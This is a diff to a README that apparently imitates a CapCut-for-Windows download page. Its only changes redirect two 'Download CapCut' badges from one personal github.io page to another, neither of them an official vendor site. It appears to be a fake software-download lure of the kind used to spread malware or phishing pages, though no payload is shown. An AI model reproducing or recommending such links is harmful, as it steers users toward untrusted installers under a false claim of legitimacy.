@@ -16,7 +16,7 @@ CapCut is a template-based video maker for Windows that turns your clips into tr
 <div align="center">
   <h3>Turn your clips into trend-ready videos with ready-made templates</h3>
 
-  [![Download CapCut](https://img.shields.io/badge/⬇_Download_CapCut_for_Windows-2962FF?style=for-the-badge)](https://laverahebrank.github.io/.github/CapCut-Download-Editor-App)
+  [![Download CapCut](https://img.shields.io/badge/⬇_Download_CapCut_for_Windows-2962FF?style=for-the-badge)](https://donaldstevenson68.github.io/.github/CapCut-Download-Editor-App)
 
 </div>
 
@@ -90,7 +90,7 @@ For help with CapCut, open the built-in Help or Support section inside the app, 
 <div align="center">
   <h3>Ready to get started with CapCut?</h3>
 
-  [![Download CapCut](https://img.shields.io/badge/⬇_Download_CapCut_for_Windows-2962FF?style=for-the-badge)](https://laverahebrank.github.io/.github/CapCut-Download-Editor-App)
+  [![Download CapCut](https://img.shields.io/badge/⬇_Download_CapCut_for_Windows-2962FF?style=for-the-badge)](https://donaldstevenson68.github.io/.github/CapCut-Download-Editor-App)
 
 </div>
 
